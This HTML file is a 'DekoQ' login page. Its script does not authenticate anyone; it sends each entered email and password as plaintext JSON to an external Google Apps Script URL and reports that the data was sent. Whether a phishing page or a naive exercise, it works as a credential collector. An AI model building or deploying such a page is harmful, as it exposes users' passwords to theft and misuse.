<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>DekoQ Login</title>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(135deg, #007BFF, #0056b3);
      font-family: 'Arial', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      text-align: center;
      color: white;
      margin-bottom: 1rem;
    }

    .container h1 {
      font-size: 3rem;
      margin: 0;
    }

    .container p {
      font-size: 1.2rem;
      margin-top: 0.5rem;
      margin-bottom: 2rem;
    }

    .login-box {
      background: white;
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
      width: 90%;
      max-width: 400px;
    }

    form {
      display: flex;
      flex-direction: column;
    }

    label {
      font-weight: bold;
      margin-bottom: 0.3rem;
      color: #000;
      text-align: left;
    }

    input[type="email"],
    input[type="password"],
    button {
      width: 100%;
      font-size: 1rem;
      border-radius: 8px;
    }

    input[type="email"] {
      padding: 0.8rem;
      padding-left: 1.2rem;
      margin-bottom: 1.2rem;
      border: 1px solid #ccc;
      text-align: left;
    }

    .password-wrapper {
      position: relative;
      margin-bottom: 1.2rem;
    }

    .password-wrapper input {
      padding: 0.8rem;
      padding-left: 1.2rem;
      padding-right: 2.5rem;
      border: 1px solid #ccc;
      width: 100%;
      text-align: left;
      border-radius: 8px;
    }

    .toggle-password {
      position: absolute;
      top: 50%;
      right: 1rem;
      transform: translateY(-50%);
      cursor: pointer;
    }

    button {
      padding: 0.8rem;
      background: #222;
      color: white;
      border: none;
      font-weight: bold;
      cursor: pointer;
    }

    button:hover {
      background: #000;
    }
  </style>
</head>
<body>
  <div>
    <div class="container">
      <h1>DekoQ</h1>
      <p>Welcome!</p>
    </div>
    <div class="login-box">
      <form id="form">
        <label for="email">Username/Email</label>
        <input type="email" id="email" name="email" required placeholder="Value" />

        <label for="password">Password</label>
        <div class="password-wrapper">
          <input type="password" id="password" name="password" required placeholder="Value" />
          <span class="toggle-password" onclick="togglePassword()">
            <!-- ไอคอนรูปตา (SVG) -->
            <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 0 24 24" width="20" fill="#888">
              <path d="M0 0h24v24H0z" fill="none"/>
              <path d="M12 6.5C7 6.5 3.1 9.8 1 14c2.1 4.2 6 7.5 11 7.5s8.9-3.3 11-7.5c-2.1-4.2-6-7.5-11-7.5zm0 13c-3.9 0-7.1-2.5-8.6-6 1.5-3.5 4.7-6 8.6-6s7.1 2.5 8.6 6c-1.5 3.5-4.7 6-8.6 6zm0-10a4 4 0 100 8 4 4 0 000-8z"/>
            </svg>
          </span>
        </div>

        <button type="submit">Submit</button>
      </form>
    </div>
  </div>

  <script>
    function togglePassword() {
      const input = document.getElementById("password");
      input.type = input.type === "password" ? "text" : "password";
    }

    const form = document.querySelector("#form");
    const scriptURL = "https://script.google.com/macros/s/AKfycby6SuSSgdHzk765vOObTNLXYNN0stvUi5qFtxFjhCqC_booYDtzbYTDm2sSVE21h9D03Q/exec";

    form.addEventListener("submit", (e) => {
      e.preventDefault();
      const email = form.email.value;
      const password = form.password.value;

      fetch(scriptURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password }),
      })
        .then(response => {
          alert("ส่งข้อมูลสำเร็จแล้ว!");
          form.reset();
        })
        .catch(error => {
          alert("เกิดข้อผิดพลาด กรุณาลองใหม่");
          console.error("Error!", error.message);
        });
    });
  </script>
</body>
</html>
